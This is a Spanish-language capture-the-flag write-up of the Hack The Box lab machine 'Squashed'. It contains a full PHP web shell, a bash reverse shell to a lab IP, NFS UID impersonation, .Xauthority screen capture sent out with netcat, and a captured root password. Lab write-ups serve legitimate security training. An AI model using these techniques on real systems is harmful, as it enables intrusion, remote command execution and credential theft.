---
layout: post
title: HTB Squashed
date: '2024-01-11 20:49:35 -0500'
categories: [HTB, Easy]
tags: [Web, Monturas, Linux, Xauthority, Keepass , NSF ]
image:
  path: /squashed/preview.png
  alt: Squashed
---

## Resumen
![logo](/squashed/logo.png){: .right w="200" h="200" }
La máquina **Squashed** es realmente interesante. Al iniciar, se encuentran dos cosas importantes: una **web** y unas **monturas**. Gracias a que se puede crear un **usuario** con el **UID** del dueño de las monturas, se puede tener total acceso sobre las mismas. Por lo tanto, se puede revisar una de ellas que parece ser la raíz de la web y subir una **web shell**, desde donde se pueden ejecutar **comandos** y ganar acceso a la máquina.

También existe un **directorio** que parece ser la **carpeta home** de uno de los usuarios de la máquina, y dentro del mismo se puede ver la cookie `.Xauthority`, de la cual se puede abusar para ver la **pantalla** de la víctima. Al realizar el respectivo ataque, se ve que tiene la **contraseña** en texto plano dentro del escritorio. Por lo tanto, se puede probar esta contraseña con otros usuarios y ganar **máximos privilegios** dentro de la misma. Fue una máquina muy divertida y con una **escalada de privilegios** increíble.


## Reconocimiento

Para empezar, se realiza un **ping** a la máquina para verificar si se cuenta con **conectividad** hacia ella.

```bash
ping 10.10.11.191  -c 1
PING 10.10.11.191 (10.10.11.191) 56(84) bytes of data.
64 bytes from 10.10.11.191: icmp_seq=1 ttl=63 time=182 ms

--- 10.10.11.191 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 181.615/181.615/181.615/0.000 ms
```
{: .nolineno}


### Escaneo de Puertos

Luego, se realiza un escaneo de puertos con ayuda de **nmap** para ver cuáles se encuentran **abiertos**.


```bash
nmap -p- --min-rate 3000 10.10.11.191  -Pn   -oG ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-11 21:00 EST
Nmap scan report for 10.10.11.191 (10.10.11.191)
Host is up (0.18s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
42025/tcp open  unknown
46813/tcp open  unknown
53907/tcp open  unknown
58633/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 27.26 seconds
```
{: .nolineno}

Y sobre cada uno de estos puertos, se realiza un escaneo mucho más profundo para identificar qué **tecnologías** se están utilizando y así detectar posibles **vulnerabilidades**.


```bash
nmap -p22,80,111,2049,42025,46813,53907,58633 -sCV  10.10.11.191 -oN version
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-11 21:01 EST
Nmap scan report for 10.10.11.191 (10.10.11.191)
Host is up (0.20s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      54579/tcp6  mountd
|   100005  1,2,3      56379/udp6  mountd
|   100005  2,3        46813/tcp   mountd
|   100005  2,3        59061/udp   mountd
|   100021  1,3,4      39349/tcp6  nlockmgr
|   100021  1,3,4      42025/tcp   nlockmgr
|   100021  1,3,4      55063/udp6  nlockmgr
|   100021  1,3,4      56449/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
42025/tcp open  nlockmgr 1-4 (RPC #100021)
46813/tcp open  mountd   2-3 (RPC #100005)
53907/tcp open  mountd   1-3 (RPC #100005)
58633/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}
## Enumeración

### Web

Para empezar, se revisa la web con el fin de identificar qué **tecnologías** se encuentran dentro de la misma,  con ayuda de `whatweb`

```bash
 whatweb http://10.10.11.191/

http://10.10.11.191/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.191], JQuery[3.0.0], Script, Title[Built Better], X-UA-Compatible[IE=edge]
```
{: .nolineno}

![web](/squashed/web.png)

Luego, se realiza una enumeración de directorios con el fin de verificar si hay algo importante dentro de la web. Esto se lleva a cabo con la ayuda de **gobuster** utilizando el siguiente comando.

```bash
gobuster dir -u http://10.10.11.191 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.191
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.11.191/images/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.191/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.191/js/]
/server-status        (Status: 403) [Size: 277]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
{: .nolineno}



### Monturas


Al revisar la web, no se observa nada **interesante**, por lo que se opta por revisar las **monturas** que pueden estar disponibles dentro de la web. Esto se puede hacer con el comando `showmount`.


```bash
showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```
{: .nolineno}

Por un lado, se puede ver una **montura** que se encuentra relacionada a un **usuario** del sistema y, por otro lado, se puede ver una que está relacionada a la carpeta **html**. Por lo que dentro de esta podría encontrarse el código de la web que revisamos anteriormente. Por lo tanto, es una buena idea montarlos en nuestro equipo con el comando `mount -t` para analizarlos.



```bash
mount -t nfs 10.10.11.191:/home/ross /mnt/ross
```
{: .nolineno}



```bash
sudo mount -t nfs 10.10.11.191:/var/www/html /mnt/html
```
{: .nolineno}



```bash
drwxr-xr-- 2017 www-data 4.0 KB Thu Jan 11 21:05:01 2024  html
drwxr-xr-x 1001 1001     4.0 KB Thu Jan 11 18:15:47 2024  ross
```
{: .nolineno}


Al listar la información de las monturas con el comando `ls -all`, se puede observar que pertenecen a un **usuario** con un identificador que no existe dentro de nuestra máquina. Gracias a esto, se puede realizar un ataque posteriormente.



## Explotación


Como se mencionó anteriormente, una **vulnerabilidad** dentro de las monturas se presenta cuando el **uid** del usuario dueño del archivo no existe dentro del equipo al que se está pasando la montura. Aunque no se cuenten con los permisos, se puede crear un nuevo usuario con el **uid** del usuario anterior y hacer que ese usuario sea el dueño para poder obtener control sobre los archivos. 

Por lo que se crea un nuevo usuario llamado **pepito**

```bash
sudo useradd -M pepito
```
{: .nolineno}

Se le asigna el identificador con el que contaba el **usuario** dueño de los archivos que se encuentran dentro del directorio **HTML**.


```bash
sudo usermod -u  2017  pepito
```
{: .nolineno}


Y al revisar de nuevo, se puede ver que el nuevo dueño de la carpeta es **pepito**.


```bash
ls -all
drwxr-xr-- pepito www-data 4.0 KB Thu Jan 11 21:40:01 2024  html
drwxr-xr-x 1001   pepito   4.0 KB Thu Jan 11 18:15:47 2024  ross
```
{: .nolineno}


Al revisar, se pueden ver los mismos directorios que fueron enumerados por **gobuster**, por lo que se piensa que se trata de la carpeta donde se encuentra alojada la web.


```bash
ls
css  images  index.html  js
```
{: .nolineno}

Dado que se cuentan con permisos de **escritura**, es posible crear un archivo en **PHP** que permita tener una **web shell** dentro de la web. Esta web shell posibilita la **ejecución remota de comandos**.


```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```
{: .nolineno}


```bash
ls
css  images  index.html  js  web.php
```
{: .nolineno}


Al revisar dentro de la web, se puede observar que se cuenta con una **RCE** (Ejecución Remota de Código), lo que permite ganar una **shell reversa** dentro del equipo víctima.


![webshell](/squashed/webshell.png)


Para esto es necesario ponerse a la escucha con `nc` para ganar la conexión.

```bash
nc -lvp 1234
```
{: .nolineno}


Dentro de la web shell, se puede enviar el siguiente comando para lanzar la **shell reversa**.


```bash
bash -c 'exec bash -i &>/dev/tcp/10.10.14.14/1234 <&1'
```
{: .nolineno}



Y se gana la **shell** dentro del equipo.

```bash
nc -lvp 1234
listening on [any] 1234 ...
connect to [10.10.14.14] from 10.10.11.191 [10.10.11.191] 50516
bash: cannot set terminal process group (1084): Inappropriate ioctl for device
bash: no job control in this shell
alex@squashed:/var/www/html$ 
```
{: .nolineno}


## Escalada de Privilegios


Por otro lado, es importante tener en cuenta que aún hay una carpeta que cuenta con la misma **vulnerabilidad** de las **monturas**, por lo que es crucial revisarla para verificar si contiene alguna **información sensible**. En este sentido, se le cambia el **identificador** a **pepito** para que ahora sea el **dueño** de la web.


```bash
drwxr-xr-- pepito www-data 4.0 KB Thu Jan 11 21:55:01 2024  html
drwxr-xr-x 1001   pepito   4.0 KB Thu Jan 11 18:15:47 2024  ross
```
{: .nolineno}



```bash
usermod -u  1001  pepito
```
{: .nolineno}



```bash
drwxr-xr-- 2017   www-data 4.0 KB Thu Jan 11 21:55:01 2024  html
drwxr-xr-x pepito pepito   4.0 KB Thu Jan 11 18:15:47 2024  ross
```
{: .nolineno}


Al revisar dentro de este, se puede observar que hay dos archivos importantes.

- **.Xauthority** : Sirve para la autenticación dentro de aplicaciones gráficas
- **Password.kdbx** : Archivo relacionado con Keepass



```bash
ls -all
total 68
drwxr-xr-x 14 pepito pepito 4096 Jan 11 18:15 .
drwxr-xr-x  4 root   root   4096 Jan 11 21:08 ..
lrwxrwxrwx  1 root   root      9 Oct 20  2022 .bash_history -> /dev/null
drwx------ 11 pepito pepito 4096 Oct 21  2022 .cache
drwx------ 12 pepito pepito 4096 Oct 21  2022 .config
drwxr-xr-x  2 pepito pepito 4096 Oct 21  2022 Desktop
drwxr-xr-x  2 pepito pepito 4096 Oct 21  2022 Documents
drwxr-xr-x  2 pepito pepito 4096 Oct 21  2022 Downloads
drwx------  3 pepito pepito 4096 Oct 21  2022 .gnupg
drwx------  3 pepito pepito 4096 Oct 21  2022 .local
drwxr-xr-x  2 pepito pepito 4096 Oct 21  2022 Music
drwxr-xr-x  2 pepito pepito 4096 Oct 21  2022 Pictures
drwxr-xr-x  2 pepito pepito 4096 Oct 21  2022 Public
drwxr-xr-x  2 pepito pepito 4096 Oct 21  2022 Templates
drwxr-xr-x  2 pepito pepito 4096 Oct 21  2022 Videos
lrwxrwxrwx  1 root   root      9 Oct 21  2022 .viminfo -> /dev/null
-rw-------  1 pepito pepito   57 Jan 11 18:15 .Xauthority
-rw-------  1 pepito pepito 2475 Jan 11 18:15 .xsession-errors
-rw-------  1 pepito pepito 2475 Dec 27  2022 .xsession-errors.old
```
{: .nolineno}



```bash
tree
.
├── Desktop
├── Documents
│   └── Passwords.kdbx
├── Downloads
├── Music
├── Pictures
├── Public
├── Templates
└── Videos
```
{: .nolineno}


Como ya se cuenta con acceso dentro de la máquina, se puede plantear un ataque mediante el uso de la cookie de **Xauthority**. Por lo tanto, se puede hacer uso del comando `w` para verificar si el usuario del que se posee la cookie se encuentra dentro de la máquina.


```bash
w
 03:02:14 up  3:46,  1 user,  load average: 0.00, 0.05, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               23:15    3:46m 21.69s  0.05s /usr/libexec/gnome-session-binary --systemd --session=gnome
```
{: .nolineno}


Al validar que **ross** se encuentra conectado, se confirma que se puede abusar de esto para tomar una captura de pantalla del usuario.


Como primer paso, es necesario añadir como variable de entorno `HOME` el directorio en el que se encuentra el archivo `.Xauthority`.


```bash
cd   
bash: cd: HOME not set
```
{: .nolineno}

```bash
export HOME=/home/alex
```
{: .nolineno}


Por lo tanto, se puede usar el siguiente comando para verificar si se cuenta con todo funcionando. Sin embargo, es importante tener en cuenta que no va a funcionar de **momento** porque el archivo no se ha transferido a la víctima.


```bash
xdpyinfo -display :0
No protocol specified
xdpyinfo:  unable to open display ":0".
```
{: .nolineno}


Por lo tanto, se monta un servidor en **Python** para que luego se consuma el archivo y se descargue dentro de la máquina.


```bash
python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
```
{: .nolineno}


```bash
wget http://10.10.14.14:8081/.Xauthority
```
{: .nolineno}


Una vez hecho esto, se puede volver a ejecutar el comando de validación y se puede observar que tiene una respuesta que ya no refleja información. Por lo tanto, se puede ver que el ataque es **factible**.



```bash
xdpyinfo -display :0 | head

name of display:    :0
version number:    11.0
vendor string:    The X.Org Foundation
vendor release number:    12013000
X.Org version: 1.20.13
maximum request size:  16777212 bytes
motion buffer size:  256
bitmap unit, bit order, padding:    32, LSBFirst, 32
image byte order:    LSBFirst
number of supported pixmap formats:    7
```
{: .nolineno}



Gracias a esta validación, se sabe que se puede tomar un **screenshot** del usuario con el siguiente comando.


```bash
xwd -root -screen -silent -display :0 > screenshot.xwd 
```
{: .nolineno}


Y para terminar, se debe transferir la imagen generada hacia la máquina del atacante para poder visualizarlo. Esto se hace con ayuda de **netcat**.


```bash
nc 10.10.14.14 8888 < screenshot.xwd
```
{: .nolineno}


```bash
nc -lvp 8888 > screenshot.xwd
```
{: .nolineno}


Y se convierte la imagen en un formato que se pueda visualizar, esto gracias al comando `convert` hacia una imagen **.png**.


```bash
convert screenshot.xwd screenshot.png
```
{: .nolineno}


```bash
open screenshot.png
```
{: .nolineno}


![screenshot](/squashed/screenshot.png)

Y al visualizarlo, se puede ver la aplicación de **keepass** abierta, en donde se puede observar algo que parece ser una **contraseña**. Eso, combinado con el archivo que se encontró anteriormente, hace pensar que esta contraseña es importante. Por lo tanto, se puede intentar autenticarse como alguno de los usuarios de la máquina, y resulta que es la contraseña del usuario **root**. Gracias a esto, se cuenta con **máximos privilegios** dentro de la máquina.


```bash
cah$mei7rai9A
```
{: .nolineno}


```bash
alex@squashed:~$ su root      
Password: 
root@squashed:/home/alex# 
```
{: .nolineno}











